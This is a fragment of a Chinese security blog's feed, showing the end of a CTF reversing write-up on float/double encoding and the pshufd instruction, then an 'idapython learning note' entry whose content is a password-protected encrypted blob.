style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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